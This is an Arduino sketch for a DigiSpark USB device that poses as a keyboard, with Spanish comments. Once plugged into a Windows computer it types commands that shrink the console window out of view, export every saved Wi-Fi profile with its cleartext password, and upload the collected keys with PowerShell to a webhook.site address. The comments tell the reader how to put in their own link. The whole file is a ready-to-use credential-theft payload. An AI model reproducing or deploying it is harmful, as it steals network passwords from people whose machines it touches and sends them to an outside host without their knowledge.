#include "DigiKeyboard.h"

// cmd /k mode con: cols=15 lines=1
const uint8_t key_arr_0[] PROGMEM = {0,6, 0,16, 0,7, 0,44, 2,36, 0,14, 0,44, 0,16, 0,18, 0,7, 0,8, 0,44, 0,6, 0,18, 0,17, 2,55, 0,44, 0,6, 0,18, 0,15, 0,22, 2,39, 0,30, 0,34, 0,44, 0,15, 0,12, 0,17, 0,8, 0,22, 2,39, 0,30};
// cd %temp%
const uint8_t key_arr_1[] PROGMEM = {0,6, 0,7, 0,44, 2,34, 0,23, 0,8, 0,16, 0,19, 2,34};
// netsh wlan export profile key=clear
const uint8_t key_arr_2[] PROGMEM = {0,17, 0,8, 0,23, 0,22, 0,11, 0,44, 0,26, 0,15, 0,4, 0,17, 0,44, 0,8, 0,27, 0,19, 0,18, 0,21, 0,23, 0,44, 0,19, 0,21, 0,18, 0,9, 0,12, 0,15, 0,8, 0,44, 0,14, 0,8, 0,28, 2,39, 0,6, 0,15, 0,8, 0,4, 0,21};
// powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
const uint8_t key_arr_3[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,22, 0,8, 0,15, 0,8, 0,6, 0,23, 0,56, 2,22, 0,23, 0,21, 0,12, 0,17, 0,10, 0,44, 0,56, 2,19, 0,4, 0,23, 0,11, 0,44, 2,26, 0,12, 2,48, 0,55, 0,27, 0,16, 0,15, 0,44, 0,56, 2,19, 0,4, 0,23, 0,23, 0,8, 0,21, 0,17, 0,44, 0,45, 0,14, 0,8, 0,28, 2,16, 0,4, 0,23, 0,8, 0,21, 0,12, 0,4, 0,15, 0,45, 0,44, 2,100, 0,44, 2,26, 0,12, 0,56, 2,9, 0,12, 0,56, 2,19, 2,4, 2,22, 2,22};
// powershell Invoke-WebRequest -Uri https://webhook.site/<TU LINK AQUI> -Method POST -InFile Wi-Fi-PASS
// para agregar tu propio link ir a webhook.site , ir a https://duckify.huhn.me/ poner STRING powershell Invoke-WebRequest -Uri https://webhook.site/<cambiar el link por el de webhook.site> -Method POST -InFile Wi-Fi-PASS
// ya que tengas tu variable de pulsaciones copiar y pegar en key_arr_4 
const uint8_t key_arr_4[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,12, 0,17, 0,25, 0,18, 0,14, 0,8, 0,56, 2,26, 0,8, 0,5, 2,21, 0,8, 0,20, 0,24, 0,8, 0,22, 0,23, 0,44, 0,56, 2,24, 0,21, 0,12, 0,44, 0,11, 0,23, 0,23, 0,19, 0,22, 2,55, 2,36, 2,36, 0,26, 0,8, 0,5, 0,11, 0,18, 0,18, 0,14, 0,55, 0,22, 0,12, 0,23, 0,8, 2,36, 0,6, 0,5, 0,32, 0,31, 0,33, 0,5, 0,36, 0,4, 0,56, 0,34, 0,33, 0,39, 0,6, 0,56, 0,33, 0,5, 0,35, 0,4, 0,56, 0,5, 0,32, 0,31, 0,7, 0,56, 0,37, 0,36, 0,34, 0,36, 0,33, 0,4, 0,8, 0,30, 0,31, 0,37, 0,39, 0,4, 0,44, 0,56, 2,16, 0,8, 0,23, 0,11, 0,18, 0,7, 0,44, 2,19, 2,18, 2,22, 2,23, 0,44, 0,56, 2,12, 0,17, 2,9, 0,12, 0,15, 0,8, 0,44, 2,26, 0,12, 0,56, 2,9, 0,12, 0,56, 2,19, 2,4, 2,22, 2,22};
// exit 
const uint8_t key_arr_5[] PROGMEM = {0,8, 0,27, 0,12, 0,23, 0,44};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed

    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(21, 8); // GUI r
    DigiKeyboard.delay(400); // DELAY 400
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING cmd /k mode con: cols=15 lines=1
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(44, 4); // ALT SPACE
    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(16, 0); // M
    DigiKeyboard.delay(200); // DELAY 200
    for(size_t i=0; i<100; ++i) {
    DigiKeyboard.sendKeyStroke(80, 0); // LEFTARROW
    }
    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(200); // DELAY 200
    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING cd %temp%
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(200); // DELAY 200
    duckyString(key_arr_2, sizeof(key_arr_2)); // STRING netsh wlan export profile key=clear
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(200); // DELAY 200
    duckyString(key_arr_3, sizeof(key_arr_3)); // STRING powershell Select-String -Path Wi*.xml ...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(200); // DELAY 200
    duckyString(key_arr_4, sizeof(key_arr_4)); // STRING powershell Invoke-WebRequest -Uri https...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(200); // DELAY 200
    duckyString(key_arr_5, sizeof(key_arr_5)); // STRING exit 
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(200); // DELAY 200
}

void loop() {}
